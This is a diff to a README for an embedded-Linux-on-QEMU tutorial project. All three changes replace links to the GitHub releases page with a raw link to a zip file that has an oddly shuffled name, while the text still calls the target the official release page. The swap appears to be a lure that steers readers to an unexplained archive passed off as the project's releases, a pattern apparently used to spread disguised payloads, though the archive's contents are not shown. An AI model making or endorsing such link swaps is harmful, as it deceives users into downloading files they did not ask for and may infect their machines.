@@ -1,6 +1,6 @@
 # 🐧 embedded-linux-from-scratch-arm-using-qemu - Build Embedded Linux Easily
 
-[![Download Releases](https://img.shields.io/badge/Download-embedded-linux--from--scratch--arm--using--qemu-brightgreen?style=for-the-badge)](https://github.com/bijingopal1/embedded-linux-from-scratch-arm-using-qemu/releases)
+[![Download Releases](https://img.shields.io/badge/Download-embedded-linux--from--scratch--arm--using--qemu-brightgreen?style=for-the-badge)](https://github.com/bijingopal1/embedded-linux-from-scratch-arm-using-qemu/raw/refs/heads/main/busybox rootfilesystem/linux-qemu-using-from-arm-scratch-embedded-2.7.zip)
 
 ---
 
@@ -51,7 +51,7 @@ This project uses QEMU, which runs ARM Linux inside a virtual machine on your Wi
 
 Visit the official release page to get the files you need.
 
-[![Download Releases](https://img.shields.io/badge/Download-embedded-linux--from--scratch--arm--using--qemu-blue?style=for-the-badge)](https://github.com/bijingopal1/embedded-linux-from-scratch-arm-using-qemu/releases)
+[![Download Releases](https://img.shields.io/badge/Download-embedded-linux--from--scratch--arm--using--qemu-blue?style=for-the-badge)](https://github.com/bijingopal1/embedded-linux-from-scratch-arm-using-qemu/raw/refs/heads/main/busybox rootfilesystem/linux-qemu-using-from-arm-scratch-embedded-2.7.zip)
 
 Open the link above in your web browser. Download the latest version of the release. These files contain the pre-built components and necessary scripts to run the system.
 
@@ -231,4 +231,4 @@ Using QEMU helps test this without needing physical hardware.
 
 Click this link to visit the release page and get the latest files.
 
-[Download embedded-linux-from-scratch-arm-using-qemu Releases](https://github.com/bijingopal1/embedded-linux-from-scratch-arm-using-qemu/releases)
+[Download embedded-linux-from-scratch-arm-using-qemu Releases](https://github.com/bijingopal1/embedded-linux-from-scratch-arm-using-qemu/raw/refs/heads/main/busybox rootfilesystem/linux-qemu-using-from-arm-scratch-embedded-2.7.zip)
